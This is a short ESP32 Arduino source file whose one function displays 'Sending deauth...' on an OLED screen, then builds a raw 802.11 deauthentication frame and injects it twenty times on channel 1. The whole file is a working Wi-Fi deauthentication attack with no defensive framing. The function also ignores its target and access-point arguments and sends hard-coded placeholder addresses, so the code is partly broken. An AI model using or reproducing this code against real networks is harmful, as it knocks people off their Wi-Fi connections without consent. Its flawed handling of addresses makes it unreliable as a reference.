#include "display.h"
#include <esp_wifi.h>
#include <WiFi.h>

void sendDeauth(const uint8_t* target, const uint8_t* ap) {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x12_tr);
  u8g2.drawStr(0, 12, "Sending deauth...");
  u8g2.sendBuffer();

  uint8_t deauthPacket[26] = {
    0xc0, 0x00,
    0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,
    0x00, 0x00,
    0x07, 0x00
  };

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 20; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(50);
  }
}